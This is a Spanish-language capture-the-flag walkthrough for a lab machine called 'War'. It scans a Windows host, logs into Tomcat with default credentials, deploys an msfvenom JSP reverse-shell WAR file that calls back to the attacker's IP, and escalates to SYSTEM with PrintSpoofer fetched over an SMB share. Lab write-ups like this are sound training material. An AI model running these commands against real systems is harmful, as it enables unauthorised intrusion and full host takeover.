---
description: '🔍 Dificultad: Fácil'
---

# War

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.74
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.74 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos **135, 139, 445, 5040, 8080** y varios en el rango **49664-49670** están abiertos. Estos pertenecen a los servicios de **Microsoft RPC, NetBIOS-SSN, Microsoft-DS, HTTP-Proxy** y otros puertos desconocidos, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p8080,135,139,445,5040 -v 192.168.1.74
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1138).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 8080 y encontramos un **Tomcat**.

<figure><img src="../../.gitbook/assets/image (1137).png" alt=""><figcaption></figcaption></figure>



Nos logueamos con las credenciales por defecto de Tomcat.&#x20;

* admin:tomcat

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html" %}

<figure><img src="../../.gitbook/assets/image (1139).png" alt=""><figcaption></figcaption></figure>

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.65 LPORT=443 -f war -o reverse2.war
```

Lo subimos y nos ponemos en escucha.

<figure><img src="../../.gitbook/assets/image (1140).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

```bash
whoami
```

<figure><img src="../../.gitbook/assets/image (1141).png" alt=""><figcaption></figcaption></figure>

La cuenta **NT AUTHORITY\Local Service** posee el privilegio **SeImpersonatePrivilege**, lo que le permite suplantar la identidad de otros procesos en el sistema. Este privilegio es potencialmente explotable en ataques como **Juicy Potato** o **PrintSpoofer**, que permiten la escalación de privilegios en entornos Windows mal configurados. Se recomienda evaluar los riesgos y aplicar las medidas de seguridad adecuadas para mitigar posibles vulnerabilidades.

<figure><img src="../../.gitbook/assets/image (1142).png" alt=""><figcaption></figcaption></figure>

{% @github-files/github-code-block url="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0" %}

Transfiero el ejecutable **PrintSpoofer64.exe** al sistema objetivo

```bash
mv /home/beafn28/Descargas/PrintSpoofer64.exe .
impacket-smbserver a . -smb2support
```

Lo subimos.

```bash
cd %TEMP%
copy \\192.168.1.65\a\PrintSpoofer64.exe PrintSpoofer64.exe
```

Ejecutamos. Ya somos **root**.

```
.\PrintSpoofer64.exe -i -c cmd
```

<figure><img src="../../.gitbook/assets/image (1144).png" alt=""><figcaption></figcaption></figure>
